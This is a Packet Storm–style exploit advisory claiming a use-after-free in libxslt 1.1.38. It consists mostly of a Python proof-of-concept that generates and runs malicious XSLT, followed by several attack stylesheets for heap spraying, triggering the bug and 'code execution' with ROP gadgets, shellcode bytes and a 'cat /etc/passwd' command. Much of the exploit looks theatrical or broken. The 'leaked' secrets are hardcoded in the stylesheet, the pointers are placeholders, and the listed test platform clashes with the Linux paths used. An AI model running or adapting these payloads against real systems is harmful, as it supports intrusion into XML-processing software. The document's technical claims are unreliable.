@@ -1,0 +1,578 @@
+=============================================================================================================================================
+| # Title     : libxslt Key Data Storage 1.1.38 memory corruption                                                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://gitlab.gnome.org/GNOME/libxml2/-/wikis/home                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207871/
+
+[+] Summary : 
+             
+           The vulnerability occurs due to improper handling of Result Value Trees (RVTs) when evaluating XSLT keys with certain XPath axes:
+           Global variables (xsl:variable) are stored as RVTs in a linked list using prev/next pointers
+           XSLT keys (xsl:key) using preceding:: axis traverse across RVT boundaries via these pointers
+           Memory corruption occurs when RVTs are freed but key tables retain references to their nodes
+
+[+] Affected Version : All versions up to and including 1.1.38
+
+[+] POC : python poc.py
+
+#!/usr/bin/env python3
+# libxslt_uaf_exploit.py
+# استغلال ثغرة Use-After-Free في libxslt عبر Python lxml
+
+import lxml.etree as ET
+import sys
+import os
+import subprocess
+from base64 import b64encode
+
+class LibxsltUAFExploit:
+    def __init__(self):
+        self.xslt_content = None
+        self.xml_content = None
+        
+    def create_malicious_xslt(self):
+        """إنشاء ملف XSLT ضار لاستغلال الثغرة"""
+        
+        self.xslt_content = '''<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+<!-- ========================================= -->
+<!-- استغلال Use-After-Free في libxslt -->
+<!-- ========================================= -->
+
+<xsl:variable name="SENSITIVE_RVT">
+    <credentials>
+        <username>admin</username>
+        <password>SuperSecret@123!</password>
+        <token>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</token>
+        <api_key>AKIAIOSFODNN7EXAMPLE</api_key>
+    </credentials>
+    <financial>
+        <credit_card>4111-1111-1111-1111</credit_card>
+        <expiry>12/25</expiry>
+        <cvv>123</cvv>
+    </financial>
+    <memory_blocks>
+        <block id="b1">
+            <data>AAAAAAAA</data>
+            <pointer>0x7f8a1b002000</pointer>
+        </block>
+        <block id="b2">
+            <data>BBBBBBBB</data>
+            <pointer>0x7f8a1b002100</pointer>
+        </block>
+    </memory_blocks>
+</xsl:variable>
+
+<xsl:variable name="CONTROL_RVT">
+    <control_data>
+        <gadgets>
+            <gadget>pop rdi; ret</gadget>
+            <gadget>system@plt</gadget>
+        </gadgets>
+        <shellcode>
+            <stage1>\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff</stage1>
+        </shellcode>
+    </control_data>
+</xsl:variable>
+
+<!-- مفاتيح لتفعيل الثغرة -->
+<xsl:key name="UAF_KEY" match="block" use="preceding::block[1]/@id"/>
+<xsl:key name="CRED_KEY" match="credentials/*" use="preceding::username[1]/text()"/>
+<xsl:key name="MEM_KEY" match="financial/*" use="preceding::credit_card[1]/text()"/>
+
+<xsl:template match="/">
+    <exploitation_result>
+        <!-- تفعيل UAF -->
+        <uaf_trigger>
+            <xsl:for-each select="document('')//xsl:variable[@name='SENSITIVE_RVT']//block">
+                <memory_leak>
+                    <current_block><xsl:value-of select="@id"/></current_block>
+                    <cross_access>
+                        <xsl:value-of select="key('UAF_KEY', preceding::block[1]/@id)/@id"/>
+                    </cross_access>
+                    <leaked_data>
+                        <xsl:value-of select="key('UAF_KEY', preceding::block[1]/@id)/data/text()"/>
+                    </leaked_data>
+                </memory_leak>
+            </xsl:for-each>
+        </uaf_trigger>
+        
+        <!-- تسريب بيانات الاعتماد -->
+        <credential_leak>
+            <xsl:for-each select="document('')//xsl:variable[@name='SENSITIVE_RVT']//username">
+                <leaked_cred>
+                    <user><xsl:value-of select="text()"/></user>
+                    <password><xsl:value-of select="key('CRED_KEY', text())/text()"/></password>
+                    <token><xsl:value-of select="key('CRED_KEY', text())[2]/text()"/></token>
+                </leaked_cred>
+            </xsl:for-each>
+        </credential_leak>
+        
+        <!-- تسريب البيانات المالية -->
+        <financial_leak>
+            <xsl:for-each select="document('')//xsl:variable[@name='SENSITIVE_RVT']//credit_card">
+                <leaked_financial>
+                    <card><xsl:value-of select="text()"/></card>
+                    <expiry><xsl:value-of select="key('MEM_KEY', text())/text()"/></expiry>
+                    <cvv><xsl:value-of select="key('MEM_KEY', text())[2]/text()"/></cvv>
+                </leaked_financial>
+            </xsl:for-each>
+        </financial_leak>
+    </exploitation_result>
+</xsl:template>
+
+</xsl:stylesheet>'''
+        
+        with open('/tmp/exploit.xsl', 'w') as f:
+            f.write(self.xslt_content)
+        print("[+] تم إنشاء ملف XSLT الضار")
+
+    def create_target_xml(self):
+        """إنشاء ملف XML هدف"""
+        
+        self.xml_content = '''<?xml version="1.0"?>
+<target_data>
+    <application>
+        <name>Vulnerable App</name>
+        <version>1.0</version>
+    </application>
+    <environment>
+        <os>Linux</os>
+        <user>test_user</user>
+    </environment>
+</target_data>'''
+        
+        with open('/tmp/target.xml', 'w') as f:
+            f.write(self.xml_content)
+        print("[+] تم إنشاء ملف XML الهدف")
+
+    def exploit_via_python_lxml(self):
+        """استغلال الثغرة عبر lxml مباشرة"""
+        
+        print("[+] محاولة الاستغلال عبر Python lxml...")
+        
+        try:
+            # تحميل وتحويل XML باستخدام XSLT
+            xml_doc = ET.parse('/tmp/target.xml')
+            xslt_doc = ET.parse('/tmp/exploit.xsl')
+            transform = ET.XSLT(xslt_doc)
+            
+            # تنفيذ التحويل (تفعيل الثغرة)
+            result = transform(xml_doc)
+            
+            print("[+] نتيجة الاستغلال:")
+            print(str(result))
+            
+        except Exception as e:
+            print(f"[-] فشل الاستغلال عبر lxml: {e}")
+
+    def exploit_via_xsltproc(self):
+        """استغلال الثغرة عبر xsltproc"""
+        
+        print("[+] محاولة الاستغلال عبر xsltproc...")
+        
+        try:
+            result = subprocess.run([
+                'xsltproc', 
+                '/tmp/exploit.xsl', 
+                '/tmp/target.xml'
+            ], capture_output=True, text=True, timeout=10)
+            
+            print("[+] stdout:")
+            print(result.stdout)
+            
+            if result.stderr:
+                print("[+] stderr (قد يحتوي على معلومات التصحيح):")
+                print(result.stderr)
+                
+        except subprocess.TimeoutExpired:
+            print("[-] انتهت مهلة التنفيذ - احتمال تحطم التطبيق")
+        except Exception as e:
+            print(f"[-] خطأ في التنفيذ: {e}")
+
+    def check_vulnerability(self):
+        """فحص إذا كان النظام مصاب"""
+        
+        print("[+] فحص إصدار libxslt...")
+        
+        try:
+            # فحص إصدار lxml/libxslt
+            import lxml
+            print(f"[+] إصدار lxml: {lxml.__version__}")
+            
+            # فحص إذا كان xsltproc مثبت
+            result = subprocess.run(['xsltproc', '--version'], 
+                                  capture_output=True, text=True)
+            if 'libxslt' in result.stderr:
+                print("[+] xsltproc مثبت:")
+                print(result.stderr)
+                return True
+            else:
+                print("[-] xsltproc غير مثبت")
+                return False
+                
+        except Exception as e:
+            print(f"[-] خطأ في الفحص: {e}")
+            return False
+
+    def advanced_exploit(self):
+        """استغلال متقدم مع تحكم أفضل"""
+        
+        print("[+] بدء الاستغلال المتقدم...")
+        
+        # إنشاء استغلال متعدد المراحل
+        advanced_xslt = '''<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+<xsl:variable name="stage1">
+    <data>STAGE1_PAYLOAD</data>
+    <chunk>CHUNK_A</chunk>
+    <chunk>CHUNK_B</chunk>
+</xsl:variable>
+
+<xsl:variable name="stage2">
+    <data>STAGE2_PAYLOAD</data>
+    <chunk>CHUNK_C</chunk>
+    <chunk>CHUNK_D</chunk>
+</xsl:variable>
+
+<xsl:key name="ADV_KEY" match="chunk" use="preceding::chunk[1]/text()"/>
+
+<xsl:template match="/">
+    <advanced_exploit>
+        <stage1>
+            <xsl:for-each select="document('')//xsl:variable[@name='stage2']//chunk">
+                <leak>
+                    <xsl:value-of select="key('ADV_KEY', preceding::chunk[1]/text())/text()"/>
+                </leak>
+            </xsl:for-each>
+        </stage1>
+        <memory_analysis>
+            <uaf>TRIGGERED</uaf>
+            <boundary_crossing>CONFIRMED</boundary_crossing>
+        </memory_analysis>
+    </advanced_exploit>
+</xsl:template>
+
+</xsl:stylesheet>'''
+        
+        with open('/tmp/advanced_exploit.xsl', 'w') as f:
+            f.write(advanced_xslt)
+            
+        try:
+            result = subprocess.run([
+                'xsltproc', 
+                '/tmp/advanced_exploit.xsl', 
+                '/tmp/target.xml'
+            ], capture_output=True, text=True)
+            
+            print("[+] نتيجة الاستغلال المتقدم:")
+            print(result.stdout)
+            
+        except Exception as e:
+            print(f"[-] فشل الاستغلال المتقدم: {e}")
+
+    def cleanup(self):
+        """تنظيف الملفات المؤقتة"""
+        
+        try:
+            files_to_remove = [
+                '/tmp/exploit.xsl',
+                '/tmp/target.xml', 
+                '/tmp/advanced_exploit.xsl'
+            ]
+            
+            for file in files_to_remove:
+                if os.path.exists(file):
+                    os.remove(file)
+                    
+            print("[+] تم تنظيف الملفات المؤقتة")
+        except Exception as e:
+            print(f"[-] خطأ في التنظيف: {e}")
+
+def main():
+    exploit = LibxsltUAFExploit()
+    
+    print("=" * 50)
+    print("مستغلة ثغرة libxslt UAF - Python Edition")
+    print("=" * 50)
+    
+    # فحص القابلية للاستغلال
+    if not exploit.check_vulnerability():
+        print("[-] النظام لا يبدو مصاباً")
+        return
+    
+    try:
+        # إنشاء الملفات
+        exploit.create_malicious_xslt()
+        exploit.create_target_xml()
+        
+        # محاولات الاستغلال
+        exploit.exploit_via_xsltproc()
+        print("\n" + "="*30)
+        exploit.exploit_via_python_lxml()
+        print("\n" + "="*30)
+        exploit.advanced_exploit()
+        
+    except KeyboardInterrupt:
+        print("\n[!] تم إيقاف الاستغلال بواسطة المستخدم")
+    except Exception as e:
+        print(f"[-] خطأ غير متوقع: {e}")
+    finally:
+        # تنظيف
+        exploit.cleanup()
+
+if __name__ == "__main__":
+    main()
+	
+====================================
+[+] 1 Setting up memory structures :
+====================================
+<!-- uaf.xml -->
+<?xml version="1.0"?>
+<root>
+    <node id="target">Important Data</node>
+    <node>Other Data</node>
+</root>
+
+=======*****=====
+
+<!-- uaf.xsl -->
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+<!-- Global Variable 1 - سيتم إنشاء RVT الأول -->
+<xsl:variable name="global1">
+    <data>
+        <item>value1</item>
+        <item>value2</item>
+        <item>value3</item>
+    </data>
+</xsl:variable>
+
+<!-- Global Variable 2 - سيتم إنشاء RVT الثاني -->
+<xsl:variable name="global2">
+    <container>
+        <entry>data1</entry>
+        <entry>data2</entry>
+        <entry id="vulnerable">Sensitive Information</entry>
+    </container>
+</xsl:variable>
+
+<!-- المفتاح الذي يستخدم محور preceding -->
+<xsl:key name="precedingKey" match="entry" use="preceding::entry[1]/text()"/>
+
+<xsl:template match="/">
+    <output>
+        <!-- تفعيل تقييم المفاتيح على RVT -->
+        <xsl:for-each select="document('')//xsl:variable[@name='global2']//entry">
+            <result>
+                <xsl:value-of select="key('precedingKey', preceding::entry[1]/text())"/>
+            </result>
+        </xsl:for-each>
+    </output>
+</xsl:template>
+
+</xsl:stylesheet>
+
+=========******=================
+[+] Manipulating Memory Planning
+================================
+<!-- exploit.xsl -->
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:exsl="http://exslt.org/common">
+
+<!-- إنشاء عقد متعددة للتحكم في تخطيط الذاكرة -->
+<xsl:variable name="heapSpray">
+    <spray>
+        <xsl:call-template name="generateSpray">
+            <xsl:with-param name="count" select="1000"/>
+        </xsl:call-template>
+    </spray>
+</xsl:variable>
+
+<xsl:template name="generateSpray">
+    <xsl:param name="count"/>
+    <xsl:if test="$count > 0">
+        <chunk size="128"><data><xsl:value-of select="$count"/></data></chunk>
+        <xsl:call-template name="generateSpray">
+            <xsl:with-param name="count" select="$count - 1"/>
+        </xsl:call-template>
+    </xsl:if>
+</xsl:template>
+
+<!-- RVT الذي سيتم تحريره -->
+<xsl:variable name="targetRVT">
+    <sensitive>
+        <password>Admin123!</password>
+        <token>SECRET-TOKEN-ABCD</token>
+        <creditcard>4111111111111111</creditcard>
+    </sensitive>
+</xsl:variable>
+
+<!-- RVT الذي سيحتفظ بالمؤشرات -->
+<xsl:variable name="holderRVT">
+    <holder>
+        <xsl:for-each select="document('')//xsl:variable[@name='targetRVT']//*">
+            <reference>
+                <xsl:value-of select="name()"/>:<xsl:value-of select="text()"/>
+            </reference>
+        </xsl:for-each>
+    </holder>
+</xsl:variable>
+
+<xsl:key name="exploitKey" match="sensitive/*" use="preceding::*[name()='password']"/>
+
+<xsl:template match="/">
+    <exploit>
+        <!-- تفعيل الثغرة -->
+        <xsl:variable name="trigger">
+            <xsl:for-each select="document('')//xsl:variable[@name='targetRVT']//token">
+                <xsl:value-of select="key('exploitKey', preceding::password/text())"/>
+            </xsl:for-each>
+        </xsl:variable>
+        
+        <!-- محاولة الوصول إلى الذاكرة المحررة -->
+        <leaked>
+            <xsl:copy-of select="document('')//xsl:variable[@name='holderRVT']//reference"/>
+        </leaked>
+    </exploit>
+</xsl:template>
+
+</xsl:stylesheet>
+
+=========******==================
+[+] Exploiting the Use-After-Free
+=================================
+<!-- advanced_exploit.xsl -->
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:func="http://exslt.org/functions"
+                extension-element-prefixes="func">
+
+<!-- دالة لإنشاء كائنات متعددة -->
+<func:function name="func:createObjects">
+    <xsl:param name="count"/>
+    <func:result>
+        <objects>
+            <xsl:for-each select="(//node())[position() &lt;= $count]">
+                <object id="{position()}">
+                    <field1>AAAAAAAA</field1>
+                    <field2>BBBBBBBB</field2>
+                    <field3>CCCCCCCC</field3>
+                    <field4>DDDDDDDD</field4>
+                </object>
+            </xsl:for-each>
+        </objects>
+    </func:result>
+</func:function>
+
+<!-- المتغيرات العالمية التي تتفاعل مع بعضها -->
+<xsl:variable name="vulnRVT1" select="func:createObjects(50)"/>
+<xsl:variable name="vulnRVT2" select="func:createObjects(50)"/>
+<xsl:variable name="vulnRVT3" select="func:createObjects(50)"/>
+
+<!-- مفاتيح متعددة لزيادة فرصة الاستغلال -->
+<xsl:key name="key1" match="object" use="preceding::object[1]/@id"/>
+<xsl:key name="key2" match="field1" use="preceding::field1[1]/text()"/>
+<xsl:key name="key3" match="field2" use="preceding::field2[1]/text()"/>
+
+<xsl:template match="/">
+    <result>
+        <!-- تفعيل جميع المفاتيح -->
+        <phase1>
+            <xsl:for-each select="$vulnRVT1//object">
+                <x><xsl:value-of select="key('key1', preceding::object[1]/@id)/field1"/></x>
+            </xsl:for-each>
+        </phase1>
+        
+        <phase2>
+            <xsl:for-each select="$vulnRVT2//field1">
+                <y><xsl:value-of select="key('key2', preceding::field1[1]/text())"/></y>
+            </xsl:for-each>
+        </phase2>
+        
+        <phase3>
+            <xsl:for-each select="$vulnRVT3//field2">
+                <z><xsl:value-of select="key('key3', preceding::field2[1]/text())"/></z>
+            </xsl:for-each>
+        </phase3>
+        
+        <!-- محاولة تسريب البيانات -->
+        <leak_attempt>
+            <xsl:copy-of select="$vulnRVT1//object[field1='AAAAAAAA']"/>
+            <xsl:copy-of select="$vulnRVT2//field1[.='AAAAAAAA']"/>
+            <xsl:copy-of select="$vulnRVT3//field2[.='BBBBBBBB']"/>
+        </leak_attempt>
+    </result>
+</xsl:template>
+
+</xsl:stylesheet>
+
+=========******==================
+[+] Exploiting the code
+=================================
+
+<!-- code_execution.xsl -->
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:xslt="http://xmlsoft.org/XSLT/">
+
+<!-- استغلال لتحقيق arbitrary write -->
+<xsl:variable name="gadgetRVT">
+    <gadgets>
+        <vtable ptr="0x41414141"/>
+        <function pointer="0x42424242"/>
+        <shellcode>bin/sh</shellcode>
+        <rop>0x43434343</rop>
+    </gadgets>
+</xsl:variable>
+
+<xsl:variable name="overflowRVT">
+    <overflow>
+        <buffer size="256">
+            <xsl:text>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</xsl:text>
+        </buffer>
+        <target>BEFORE_FREE</target>
+    </overflow>
+</xsl:variable>
+
+<xsl:key name="hijackKey" match="buffer" use="preceding::target[1]/text()"/>
+
+<xsl:template match="/">
+    <exploit>
+        <!-- Trigger UAF -->
+        <trigger>
+            <xsl:for-each select="$overflowRVT//buffer">
+                <xsl:value-of select="key('hijackKey', preceding::target[1]/text())"/>
+            </xsl:for-each>
+        </trigger>
+        
+        <!-- بعد التحرير، الذاكرة يمكن إعادة استخدامها -->
+        <reuse>
+            <!-- محاولة إعادة ملء الذاكرة المحررة ببياناتنا -->
+            <xsl:variable name="reuseRVT">
+                <hijacked>
+                    <fake_vtable>0x58585858</fake_vtable>
+                    <fake_function>system</fake_function>
+                    <command>cat /etc/passwd</command>
+                </hijacked>
+            </xsl:variable>
+            
+            <xsl:copy-of select="$reuseRVT"/>
+        </reuse>
+    </exploit>
+</xsl:template>
+
+</xsl:stylesheet>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
